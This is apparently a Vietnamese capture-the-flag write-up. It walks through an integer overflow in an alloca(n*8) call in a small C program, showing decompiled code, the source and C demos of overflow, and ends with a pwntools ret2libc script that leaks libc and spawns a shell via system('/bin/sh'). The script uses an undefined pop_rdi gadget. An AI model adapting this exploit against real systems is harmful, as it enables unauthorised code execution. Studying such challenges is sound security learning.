# IDA
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned __int64 v3; // rax
  void *v4; // rsp
  unsigned __int64 v6; // [rsp+8h] [rbp-10h] BYREF
  unsigned __int64 *v7; // [rsp+10h] [rbp-8h]

  init();
  puts("Secret saver!");
  puts("How long is your secret?");
  printf("> ");
  __isoc99_scanf("%lu", &v6);
  v3 = 16 * ((8 * v6 + 23) / 0x10);
  while ( &v6 != (unsigned __int64 *)((char *)&v6 - (v3 & 0xFFFFFFFFFFFFF000LL)) )
    ;
  v4 = alloca(v3 & 0xFFF);
  if ( (v3 & 0xFFF) != 0 )
    *(unsigned __int64 *)((char *)&v6 + (v3 & 0xFFF) - 8) = *(unsigned __int64 *)((char *)&v6 + (v3 & 0xFFF) - 8);
  v7 = &v6;
  printf("Enter your secret: ");
  read_str((__int64)v7, v6);
  return 0;
}
```  

# Source 
```
#include <stdio.h>
#include <alloca.h>
#include <unistd.h>

void init()
{
	setbuf(stdin, 0);
	setbuf(stdout, 0);
	setbuf(stderr, 0);
}

void read_str(char *buffer, unsigned long int n)
{
	char c;
	unsigned long int i = 0;
	while (i < n)
	{
		read(0, &c, 1);
		if (c == '\n')
			break;
		buffer[i] = c;
		i++;
	}
	buffer[i] = '\0';
}

int main()
{
	char *buffer;
	unsigned long int n;

	init();

	puts("Secret saver!");
	puts("How long is your secret?");
	printf("> ");
	scanf("%lu", &n);

	buffer = alloca(n*8);
	printf("Enter your secret: ");
	read_str(buffer, n);
}
```

* khi nhìn vào source ta thấy có hàm alloca() thì hàm này có chức năng tương tự như malloc là cấp phát bộ nhớ nhưng thay vì nằm trên heap như malloc thì alloca cấp phát bộ nhớ trên stack. ví dụ alloca(16) sẽ cấp phát 16 byte  
* khi nhìn vào source code ta thấy được ```alloca(n*8)``` thì ta phát hiện ở đây là lỗi IOF, ta sẽ lấy một ví dụ sau.

##### ví dụ
```c
#include <stdio.h>

int main()
{
    int a;
    scanf("%d", &a);
    printf("%d", a * 8);
}
```

phạm vi của int là ```-2,147,483,648 tới 2,147,483,647``` và em tính toán ```2147483647/8 = 268435455.875```, em thử với giá trị làm trò xuống ```268435455``` thì ```Output: 2147483640 ``` oke còn trong phạm vi, nhưng nếu e làm tròn lên ```268435456``` thì ```Output: -2147483648```, ta đã tràn phạm vi nên nó thành só âm =)))
* vậy nếu bây giờ, em thử khai báo một biến là long, sau đó gán biểu thức ```a*8``` thì kết quả như thế nào
```c
#include <stdio.h>
int main()
{
    int a;
    scanf("%d", &a);
    long b = a * 8;
    printf("%ld", b);
}
```
```input: 268435456 --- output: -2147483648``` =))) vậy qua phép thử trên và nhiều lần lập trình thì em hiểu là ```a*8``` nghĩa là ```(int) * (int) ```, thì ngôn ngữ C nó sẽ tự ép kiểu theo kiểu dữ liệu có phạm vi lớn nhất trong phép tính, trong trường hợp ``` int * int ``` thì nó sẽ tự hiểu là giá trị sau khi tính sẽ trả về dữ liệu int. Ví dụ trường hợp ```(int) * (long)``` thì giá trị trả về là long.
> từ những phép thử trên ta thấy lỗi IOF ở ```alloca(n * 8) ```
nghĩa là nếu ta nhập n sao cho n * 8 nó tràn ra phạm vi của unsigned long int để trả về giá trị nhỏ, hàm alloca sẽ cấp phát giá trị nhỏ đó và ta vẫn có thể nhập được số lượng kí tự lớn để BOF. 

# Thực thi
* Ở đây mỗi giá trị khác nhau cho ta những payload khác nhau về offset (giá trị nhỏ nhất là 0x2000000000000000), ở đây em chọn 0x2000000000000001
* Chạy thử debug thì ta đã đúng, khi ta đã cấp phát bộ nhớ nhỏ và số lượng kí tự nhập vào lớn  
![image](https://user-images.githubusercontent.com/111769169/222918324-d23d04d7-6676-4b7d-8b7b-77182c08da22.png)  
* việc sau đó là ret2libc
<details> <summary> script </summary>
	
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./iof1_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe
def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, gdbscript='''
                    b*main+267
                    c
                    ''')
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    input()
    
    #################
    ### leak libc ###
    #################
    r.sendlineafter(b"> ", b'2305843009213693953')
    payload = b'a' * 40 + p64(pop_rdi) + p64(exe.got['puts'])
    payload += p64(exe.plt['puts']) + p64(exe.sym['main'])
    r.sendlineafter(b'secret: ', payload)

    ######################
    ### tinh base libc ###
    ######################
    leak = u64(r.recvline(keepends=False) + b'\0\0')
    log.info("leak libc: " + hex(leak))
    libc.address = leak - 0x783a0
    log.info("base libc: " + hex(libc.address))
    r.sendlineafter(b"> ", b'2305843009213693953')

    #################
    ### tao shell ###
    #################
    payload = b'a' * 40
    payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
    payload += p64(libc.sym['system'])
    r.sendlineafter(b'secret: ', payload)

    r.interactive()


if __name__ == "__main__":
    main()
```
	
</summary>
